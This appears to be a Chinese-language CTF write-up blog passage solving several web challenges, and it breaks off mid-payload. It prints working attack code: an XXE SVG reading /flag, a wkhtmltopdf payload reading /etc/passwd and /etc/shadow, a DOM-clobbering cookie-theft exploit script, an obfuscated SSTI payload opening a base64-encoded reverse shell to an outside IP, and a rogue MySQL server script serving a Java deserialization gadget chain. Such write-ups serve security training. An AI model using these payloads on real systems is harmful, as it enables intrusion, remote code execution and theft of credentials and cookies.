link-icon"></i></a></p><p><a class="link" target="_blank" rel="noopener" href="https://www.xiaotian.org.cn/2025/05/05/miniLCTF2025-WebMisc%E5%87%BA%E9%A2%98%E4%B8%8EWP/#PyBox-Web">miniLCTF2025-Web&#x2F;Misc出题与WP - xt’s blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p><h3 id="web-Image-Viewer"><a href="#web-Image-Viewer" class="headerlink" title="web-Image Viewer"></a>web-Image Viewer</h3><p>是一个图片阅览的功能</p><p>他会解析内容然后转成base64字符串</p><p>所以我们自然想到了构造一个恶意的svg图片让服务器解析</p><p>payload</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:///flag&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109174932865.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109175029255.png"></p><h3 id="web-PDF-Viewer"><a href="#web-PDF-Viewer" class="headerlink" title="web-PDF Viewer"></a>web-PDF Viewer</h3><p>打开发现是一个把网站转换为pdf的功能</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109173854944.png"></p><p>把里面链接换成我们的vps</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109173930871.png"></p><p>发现里面的功能实现是靠一个叫wkhtmltopdf的东西</p><p>搜一搜发现文章</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109174105120.png"></p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;blahblah&lt;/h1&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">x=new XMLHttpRequest;</span><br><span class="line">x.onload=function()&#123;</span><br><span class="line">document.write(this.responseText)</span><br><span class="line">&#125;;</span><br><span class="line">x.open(&#x27;GET&#x27;,&#x27;file:///etc/passwd&#x27;);</span><br><span class="line">x.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div><p>尝试读环境变量，让我们换思路</p><p>然后发现有一个登陆功能</p><p>我们又找到一篇文章</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109174519659.png"></p><p>去读&#x2F;etc&#x2F;shadow</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109174400474.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109174413128.png"></p><p>得到密码</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109174446020.png"></p><h3 id="web-Xross-The-Doom"><a href="#web-Xross-The-Doom" class="headerlink" title="web-Xross The Doom"></a>web-Xross The Doom</h3><p><strong>漏洞分析</strong></p><p><strong>关键点：</strong></p><ol><li><p><strong>目标</strong>：Bot访问<code>/admin/review/{id}</code>时会携带包含FLAG的cookie（[FLAG&#x3D;flag{xxx}](vscode-file:&#x2F;&#x2F;vscode-app&#x2F;d:&#x2F;Users&#x2F;tiran&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Microsoft VS Code&#x2F;resources&#x2F;app&#x2F;out&#x2F;vs&#x2F;code&#x2F;electron-browser&#x2F;workbench&#x2F;workbench.html)，路径为<code>/admin</code>）</p></li><li><p><strong>DOMPurify绕过</strong>：虽然内容经过了DOMPurify过滤，但[admin.js](vscode-file:&#x2F;&#x2F;vscode-app&#x2F;d:&#x2F;Users&#x2F;tiran&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Microsoft VS Code&#x2F;resources&#x2F;app&#x2F;out&#x2F;vs&#x2F;code&#x2F;electron-browser&#x2F;workbench&#x2F;workbench.html)中存在DOM Clobbering漏洞：</p><div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> auto = <span class="title function_">asBool</span>(<span class="variable language_">window</span>.<span class="property">AUTO_SHARE</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="title function_">asPath</span>(<span class="variable language_">window</span>.<span class="property">CONFIG_PATH</span>);</span><br><span class="line"><span class="keyword">const</span> includeCookie = <span class="title function_">asBool</span>(<span class="variable language_">window</span>.<span class="property">CONFIG_COOKIE_DEBUG</span>);</span><br></pre></td></tr></table></figure></div></li><li><p><strong>逻辑漏洞</strong>：当这些值为true&#x2F;特定值时，会自动发送请求带上cookie：</p><div class="code-container" data-rel="Js"><figure class="iseeu highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (auto) &#123;</span><br><span class="line">  <span class="keyword">const</span> target = <span class="title function_">buildTarget</span>(<span class="string">&#x27;/analytics&#x27;</span>, path);</span><br><span class="line">  <span class="keyword">if</span> (includeCookie) &#123;</span><br><span class="line">    qs.<span class="title function_">set</span>(<span class="string">&#x27;c&#x27;</span>, <span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">fetch</span>(target + <span class="string">&#x27;?&#x27;</span> + qs.<span class="title function_">toString</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p><strong>路径遍历</strong>：[buildTarget](vscode-file:&#x2F;&#x2F;vscode-app&#x2F;d:&#x2F;Users&#x2F;tiran&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Microsoft VS Code&#x2F;resources&#x2F;app&#x2F;out&#x2F;vs&#x2F;code&#x2F;electron-browser&#x2F;workbench&#x2F;workbench.html)函数支持<code>..</code>来构造任意路径，可以访问<code>/log</code>端点</p></li></ol><p><strong>攻击步骤</strong></p><p>创建一个payload，利用DOM Clobbering来控制这些变量：</p><div class="code-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;AUTO_SHARE&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;CONFIG_COOKIE_DEBUG&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;CONFIG_PATH&quot;</span> <span class="attr">action</span>=<span class="string">&quot;../log&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>这样会导致：</p><ul><li>[window.AUTO_SHARE](vscode-file:&#x2F;&#x2F;vscode-app&#x2F;d:&#x2F;Users&#x2F;tiran&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Microsoft VS Code&#x2F;resources&#x2F;app&#x2F;out&#x2F;vs&#x2F;code&#x2F;electron-browser&#x2F;workbench&#x2F;workbench.html) &#x3D; <code>&lt;a&gt;</code>元素（truthy）</li><li>[window.CONFIG_COOKIE_DEBUG](vscode-file:&#x2F;&#x2F;vscode-app&#x2F;d:&#x2F;Users&#x2F;tiran&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Microsoft VS Code&#x2F;resources&#x2F;app&#x2F;out&#x2F;vs&#x2F;code&#x2F;electron-browser&#x2F;workbench&#x2F;workbench.html) &#x3D; <code>&lt;a&gt;</code>元素（truthy）</li><li>[window.CONFIG_PATH](vscode-file:&#x2F;&#x2F;vscode-app&#x2F;d:&#x2F;Users&#x2F;tiran&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Microsoft VS Code&#x2F;resources&#x2F;app&#x2F;out&#x2F;vs&#x2F;code&#x2F;electron-browser&#x2F;workbench&#x2F;workbench.html) &#x3D; <code>&lt;form&gt;</code>元素，[action&#x3D;”..&#x2F;log”](vscode-file:&#x2F;&#x2F;vscode-app&#x2F;d:&#x2F;Users&#x2F;tiran&#x2F;AppData&#x2F;Local&#x2F;Programs&#x2F;Microsoft VS Code&#x2F;resources&#x2F;app&#x2F;out&#x2F;vs&#x2F;code&#x2F;electron-browser&#x2F;workbench&#x2F;workbench.html)</li><li>最终请求到<code>/log?id=xxx&amp;ua=xxx&amp;c=FLAG=flag{xxx}</code></li></ul><p>然后访问<code>/logs</code>端点查看收集到的cookie。</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">TARGET = <span class="string">&#x27;019a77fb-ace6-70f8-aa39-ce16e4217a99.geek.ctfplus.cn&#x27;</span></span><br><span class="line">BASE_URL = <span class="string">f&#x27;http://<span class="subst">&#123;TARGET&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DOM Clobbering payload</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&lt;a id=&quot;AUTO_SHARE&quot;&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;a id=&quot;CONFIG_COOKIE_DEBUG&quot;&gt;&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;form id=&quot;CONFIG_PATH&quot; action=&quot;../log&quot;&gt;&lt;/form&gt;&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] 开始攻击...&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] 目标: <span class="subst">&#123;BASE_URL&#125;</span>&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤1: 创建恶意帖子</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] 步骤 1: 创建包含DOM Clobbering payload的帖子...&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.post(</span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;BASE_URL&#125;</span>/api/posts&#x27;</span>,</span><br><span class="line">            json=&#123;</span><br><span class="line">                <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;Test Post&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;content&#x27;</span>: payload</span><br><span class="line">            &#125;,</span><br><span class="line">            timeout=<span class="number">10</span></span><br><span class="line">        )</span><br><span class="line">        data = resp.json()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data.get(<span class="string">&#x27;ok&#x27;</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;[-] 创建帖子失败: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        post_id = data[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] 帖子创建成功! ID: <span class="subst">&#123;post_id&#125;</span>&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] 请求失败: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤2: 触发bot访问</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] 步骤 2: 触发bot访问...&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(</span><br><span class="line">            <span class="string">f&#x27;<span class="subst">&#123;BASE_URL&#125;</span>/bot&#x27;</span>,</span><br><span class="line">            params=&#123;<span class="string">&#x27;id&#x27;</span>: post_id&#125;,</span><br><span class="line">            timeout=<span class="number">10</span></span><br><span class="line">        )</span><br><span class="line">        bot_data = resp.json()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[+] Bot触发成功: <span class="subst">&#123;bot_data.get(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;ok&quot;</span>)&#125;</span>&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] 触发bot失败: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤3: 等待bot访问完成</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] 步骤 3: 等待bot处理 (5秒)...&#x27;</span>)</span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 步骤4: 获取日志</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] 步骤 4: 获取日志...&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        resp = requests.get(<span class="string">f&#x27;<span class="subst">&#123;BASE_URL&#125;</span>/logs&#x27;</span>, timeout=<span class="number">10</span>)</span><br><span class="line">        logs_data = resp.json()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;logs&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> logs_data <span class="keyword">or</span> <span class="built_in">len</span>(logs_data[<span class="string">&#x27;logs&#x27;</span>]) == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[-] 未找到日志&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n[+] 日志记录:&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;=&#x27;</span> * <span class="number">60</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 查找包含FLAG的日志</span></span><br><span class="line">        flag_found = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> log <span class="keyword">in</span> logs_data[<span class="string">&#x27;logs&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n时间: <span class="subst">&#123;log.get(<span class="string">&#x27;time&#x27;</span>, <span class="string">&#x27;N/A&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Cookie: <span class="subst">&#123;log.get(<span class="string">&#x27;cookie&#x27;</span>, <span class="string">&#x27;N/A&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;User-Agent: <span class="subst">&#123;log.get(<span class="string">&#x27;ua&#x27;</span>, <span class="string">&#x27;N/A&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            cookie = log.get(<span class="string">&#x27;cookie&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;FLAG=&#x27;</span> <span class="keyword">in</span> cookie:</span><br><span class="line">                flag_match = re.search(<span class="string">r&#x27;FLAG=([^;]+)&#x27;</span>, cookie)</span><br><span class="line">                <span class="keyword">if</span> flag_match:</span><br><span class="line">                    flag = flag_match.group(<span class="number">1</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;\n&#x27;</span> + <span class="string">&#x27;=&#x27;</span> * <span class="number">60</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;🚩 FLAG 找到了!&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&#x27;🚩 <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;=&#x27;</span> * <span class="number">60</span>)</span><br><span class="line">                    flag_found = <span class="literal">True</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> flag_found:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n[-] 未在日志中找到FLAG，可能需要重试&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] 获取日志失败: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exploit()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n[!] 用户中断&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;[-] 错误: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251112201650018.png"></p><h3 id="web-路在脚下-revenge"><a href="#web-路在脚下-revenge" class="headerlink" title="web-路在脚下_revenge"></a>web-路在脚下_revenge</h3><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109175406337.png"></p><p>回显name字段</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109175348728.png"></p><p>测试发现是一个无回显的ssti</p><p>反弹shell</p><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;((sbwaf|attr(&#x27;__eq__&#x27;))[&#x27;__g&#x27;&#x27;lobals__&#x27;][&#x27;s&#x27;&#x27;ys&#x27;][&#x27;modules&#x27;][&#x27;o&#x27;&#x27;s&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](&#x27;bash$&#123;IFS&#125;-c$&#123;IFS&#125;\&#x27;&#123;echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC80Ny4xMjIuMTE1LjI5Lzc3NzcgMD4mMQ%3D%3D&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&#x27;&#x27;))[&#x27;read&#x27;]()&#125;&#125;</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109175650214.png"></p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251109175722696.png"></p><h3 id="web-ezjdbc"><a href="#web-ezjdbc" class="headerlink" title="web-ezjdbc"></a>web-ezjdbc</h3><p>根据依赖和源码,确定要打JBDC反序列化</p><p><img lazyload src="/images/loading.svg" data-src="https://tiran.oss-cn-wuhan-lr.aliyuncs.com/images/20251121201731994.png"></p><p>在vps上启用一个恶意mysql服务,传输payload</p><p>脚本为</p><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">greeting_data=<span class="string">&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;</span></span><br><span class="line">response_ok_data=<span class="string">&quot;0700000200000002000000&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">receive_data</span>(<span class="params">conn</span>):</span><br><span class="line">    data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Receiveing the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">conn,data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Sending the package : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(data))</span><br><span class="line">    conn.send(binascii.a2b_hex(data))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_payload_content</span>():</span><br><span class="line">    <span class="comment">#file文件的内容使用ysoserial生成的 使用规则：java -jar ysoserial [Gadget] [command] &gt; payload</span></span><br><span class="line">    file= <span class="string">r&#x27;payload&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isfile(file):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            payload_content = binascii.b2a_hex(f.read()).decode()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open successs&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;open false&quot;</span>)</span><br><span class="line">        <span class="comment">#calc</span></span><br><span class="line">        payload_content=<span class="string">&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e